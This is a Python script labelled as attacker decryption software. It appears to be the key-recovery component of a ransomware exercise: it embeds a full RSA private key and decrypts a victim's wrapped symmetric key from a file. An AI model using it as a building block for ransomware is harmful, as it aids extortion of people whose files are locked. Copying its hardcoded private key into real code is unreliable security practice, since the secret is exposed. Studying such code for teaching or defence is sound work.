#Attacker Decryption Software

#Import the required libraries
import sys
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

#Hardcoded Private Key
d_key = b'''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''

private_key = RSA.import_key(d_key)

#Get the encrypted file name from the command line
if len(sys.argv) != 2:
    print("Usage: python AD6.py <encrypted_key>")
    sys.exit(1)

encrypted_key = sys.argv[1]
#Decrypt the file

with open(encrypted_key, 'rb') as f:
    encrypted_data = f.read()
    cipher = PKCS1_OAEP.new(private_key)
    decrypted_data = cipher.decrypt(encrypted_data)

    #Write the decrypted file
    with open(f'DecryptedSharedKey', 'wb') as f:
        f.write(decrypted_data)

